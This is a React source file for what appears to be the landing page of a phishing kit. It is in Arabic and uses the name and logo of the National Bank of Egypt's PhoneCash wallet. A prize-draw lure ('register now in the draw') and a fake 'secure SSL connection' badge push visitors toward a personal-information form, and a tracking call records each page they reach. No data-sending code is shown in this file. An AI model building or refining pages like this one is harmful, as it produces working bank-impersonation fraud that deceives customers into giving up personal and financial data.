import { useEffect } from "react";
import { useLocation } from "wouter";
import { navigateToPage } from "@/lib/store";

export default function HomePage() {
  const [, setLocation] = useLocation();

  useEffect(() => {
    navigateToPage("الصفحة الرئيسية - محفظة الأهلي");
  }, []);

  return (
    <div className="min-h-screen bg-gradient-to-b from-[#1a4d2e] to-[#2d6b3f] flex flex-col items-center justify-center p-4" dir="rtl">
      {/* Background Pattern */}
      <div className="absolute inset-0 opacity-5">
        <div className="absolute inset-0" style={{
          backgroundImage: `repeating-linear-gradient(45deg, transparent, transparent 35px, rgba(255,255,255,0.1) 35px, rgba(255,255,255,0.1) 70px)`,
        }}></div>
      </div>

      <div className="relative z-10 w-full max-w-md flex flex-col items-center">
        {/* NBE Logo */}
        <div className="mb-8">
          <img
            src="/images/nbe-phonecash-logo.jpg"
            alt="NBE PhoneCash"
            className="w-32 h-32 md:w-40 md:h-40 rounded-2xl shadow-lg"
          />
        </div>

        {/* Welcome Text */}
        <div className="text-center mb-8">
          <h1 className="text-3xl md:text-4xl font-bold text-white mb-3">
            محفظة الأهلي
          </h1>
          <p className="text-green-100 text-lg md:text-xl">
            NBE PhoneCash
          </p>
          <p className="text-green-200/80 text-sm mt-2">
            البنك الأهلي المصري
          </p>
        </div>

        {/* Main Card */}
        <div className="bg-white/95 backdrop-blur-sm rounded-2xl shadow-2xl p-6 md:p-8 w-full">
          <div className="text-center mb-6">
            <div className="w-16 h-16 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-4">
              <svg className="w-8 h-8 text-green-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 8c-1.657 0-3 .895-3 2s1.343 2 3 2 3 .895 3 2-1.343 2-3 2m0-8c1.11 0 2.08.402 2.599 1M12 8V7m0 1v8m0 0v1m0-1c-1.11 0-2.08-.402-2.599-1M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
              </svg>
            </div>
            <h2 className="text-xl font-bold text-gray-800 mb-2">
              سجل في السحب الآن
            </h2>
            <p className="text-gray-500 text-sm">
              سجل بياناتك للدخول في سحب محفظة الأهلي
            </p>
          </div>

          <button
            onClick={() => setLocation("/personal-info")}
            className="w-full bg-gradient-to-l from-[#1a4d2e] to-[#2d6b3f] hover:from-[#163f26] hover:to-[#245a34] text-white font-bold py-4 px-6 rounded-xl transition-all duration-300 transform hover:scale-[1.02] active:scale-[0.98] shadow-lg hover:shadow-xl text-lg"
          >
            سجل الآن
          </button>

          <p className="text-center text-gray-400 text-xs mt-4">
            بالتسجيل أنت توافق على الشروط والأحكام
          </p>
        </div>

        {/* SSL Footer */}
        <div className="mt-6 flex items-center gap-2 text-green-200/70">
          <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 20 20">
            <path fillRule="evenodd" d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z" clipRule="evenodd" />
          </svg>
          <span className="text-xs">اتصال آمن ومشفر SSL</span>
        </div>
      </div>
    </div>
  );
}
